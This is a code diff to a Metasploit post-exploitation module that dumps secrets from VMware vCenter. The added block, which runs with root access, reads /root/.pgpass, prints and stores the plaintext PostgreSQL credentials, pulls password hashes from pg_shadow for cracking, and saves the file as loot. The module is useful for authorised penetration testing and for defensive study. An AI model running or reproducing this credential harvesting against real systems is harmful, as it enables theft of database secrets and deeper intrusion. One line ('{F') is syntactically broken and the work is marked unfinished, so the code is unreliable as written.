@@ -10,9 +10,10 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
   include Msf::Auxiliary::Report
+  include Msf::Post::Linux::Priv
   include Msf::Post::Vcenter::Vcenter
+  include Msf::Post::Vcenter::Database
 
-  Rank = ManualRanking
   def initialize(info = {})
     super(
       update_info(
@@ -35,7 +36,11 @@ class MetasploitModule < Msf::Post
           associated private keys are also plundered and can be used to
           sign forged SAML assertions for the /ui admin interface.
         },
-        'Author' => 'npm[at]cesium137.io',
+        'Author' => [
+         'npm[at]cesium137.io', # original vcenter secrets dump
+         'Erik Wynter', # @wyntererik, postgres additions
+         'h00die' # tying it all together
+        ],
         'Platform' => [ 'linux', 'unix' ],
         'DisclosureDate' => '2022-04-15',
         'SessionTypes' => [ 'meterpreter', 'shell' ],
@@ -117,6 +122,51 @@ class MetasploitModule < Msf::Post
         enum_vm_cust_spec
       end
     end
+    if is_root?
+      print_status('Retrieving .pgpass file')
+      retrieved_pg_creds = false
+      retrieved_vpx_creds = false
+      pgpass_contents = process_pgpass_file
+
+      pgpass_contents.each do |p|
+        extra_service_data = {F
+          address: p['hostname'] =~ /localhost|127.0.0.1/ ? Rex::Socket.getaddress(rhost) : p['hostname'],
+          port: p['port'],
+          service_name: 'psql',
+          protocol: 'tcp',
+          workspace_id: myworkspace_id,
+          module_fullname: fullname,
+          origin_type: :service
+        }
+        print_good(".pgpass creds found: #{p['username']}, #{p['password']} for #{p['hostname']}:#{p['database']}")
+        store_valid_credential(user: p['username'], private: p['password'], service_data: extra_service_data, private_type: :password)
+        next unless p['database'] == 'postgres'
+        next if retrieved_pg_creds == true
+
+        creds = query_pg_shadow_values(p['password'], p['username'], p['database'])
+        retrieved_pg_creds = true unless creds.nil?
+        creds.each do |cred|
+          print_good("posgres database creds found: #{cred['user']}, #{cred['password_hash']}")
+          credential_data = {
+            username: cred['user'],
+            private_data: cred['password_hash'],
+            private_type: :nonreplayable_hash,
+            jtr_format: Metasploit::Framework::Hashes.identify_hash(cred['password_hash'])
+          }.merge(extra_service_data)
+
+          login_data = {
+            core: create_credential(credential_data),
+            status: Metasploit::Model::Login::Status::UNTRIED
+          }.merge(extra_service_data)
+
+          create_credential_login(login_data)
+        end
+        # XXX we need to do like above but for query_vpx_creds(pg_password, vcdb_user, vcdb_name, vc_sym_key_raw)
+      end
+      path = store_loot('.pgpass', 'text/plain', session, pgpass_contents, 'pgpass.json')
+      print_good("Saving the /root/.pgpass contents to #{path}")
+    end
+    
   end
 
   def vmdir_init
